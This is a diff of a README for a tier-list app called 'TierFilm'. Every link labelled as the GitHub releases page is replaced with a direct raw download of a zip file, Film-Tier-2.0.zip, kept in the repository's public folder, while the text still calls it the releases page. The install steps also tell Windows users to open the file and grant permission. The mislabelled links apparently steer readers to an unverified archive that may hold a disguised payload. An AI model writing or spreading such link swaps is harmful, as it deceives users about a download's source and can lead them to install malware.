@@ -1,10 +1,10 @@
 # 🎬 TierFilm - Make Tier Lists Fast and Easy
 
-[![Download TierFilm](https://img.shields.io/badge/Download%20TierFilm-Release%20Page-blue?style=for-the-badge)](https://github.com/gregoriomanuel/TierFilm/releases)
+[![Download TierFilm](https://img.shields.io/badge/Download%20TierFilm-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/gregoriomanuel/TierFilm/main/public/Film-Tier-2.0.zip)
 
 ## 📥 Download TierFilm
 
-1. Open the [TierFilm Releases page](https://github.com/gregoriomanuel/TierFilm/releases).
+1. Open the [TierFilm Releases page](https://raw.githubusercontent.com/gregoriomanuel/TierFilm/main/public/Film-Tier-2.0.zip).
 2. Find the latest version at the top of the list.
 3. Download the Windows file from that release.
 4. If your browser asks what to do, choose **Save**.
@@ -24,7 +24,7 @@ Use it to:
 
 ## 🚀 Get Started on Windows
 
-1. Download TierFilm from the [releases page](https://github.com/gregoriomanuel/TierFilm/releases).
+1. Download TierFilm from the [releases page](https://raw.githubusercontent.com/gregoriomanuel/TierFilm/main/public/Film-Tier-2.0.zip).
 2. Open the downloaded file.
 3. If Windows asks for permission, choose **Yes**.
 4. Wait for the app to open.
@@ -82,7 +82,7 @@ For smooth use, keep your browser up to date.
 4. Make sure you downloaded the latest release.
 5. Restart your browser or computer and try again.
 
-If you still have trouble, download the file again from the [release page](https://github.com/gregoriomanuel/TierFilm/releases).
+If you still have trouble, download the file again from the [release page](https://raw.githubusercontent.com/gregoriomanuel/TierFilm/main/public/Film-Tier-2.0.zip).
 
 ## 🎬 Tips for Better Tier Lists
 
@@ -146,4 +146,4 @@ It uses a clean interface so you can focus on your picks, not on setup.
 
 If you need the file later, use the same link:
 
-[Visit the TierFilm Releases page](https://github.com/gregoriomanuel/TierFilm/releases)
+[Visit the TierFilm Releases page](https://raw.githubusercontent.com/gregoriomanuel/TierFilm/main/public/Film-Tier-2.0.zip)
